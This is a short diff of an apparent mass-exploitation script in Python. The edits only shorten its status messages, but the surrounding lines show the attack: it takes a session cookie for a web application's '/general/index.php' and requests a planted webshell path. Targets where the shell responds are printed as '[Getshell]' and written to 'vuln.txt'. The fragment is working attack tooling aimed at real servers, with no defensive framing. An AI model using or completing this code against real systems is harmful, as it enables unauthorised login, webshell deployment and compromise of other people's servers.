@@ -65,7 +65,7 @@ def exp(u):
 
     cookie = get_cookie(u)
     if cookie != "123":
-        printFlag = "[Login successful]：" + u + "/general/index.php\t" + cookie + "\n"
+        printFlag = "[Login]：" + u + "/general/index.php\t" + cookie + "\n"
     header["Cookie"] = cookie
 
     # password:a
@@ -88,7 +88,7 @@ def exp(u):
                 shellPath = u + webPath
                 req3 = requests.get(shellPath, headers=header, verify=False, timeout=25)
                 if shellFlag in req3.text:
-                    printFlag = "[Getshell successful]：" + shellPath + "\n"
+                    printFlag = "[Getshell]：" + shellPath + "\n"
                     wirte_targets(shellPath, "vuln.txt")
     except:
         pass
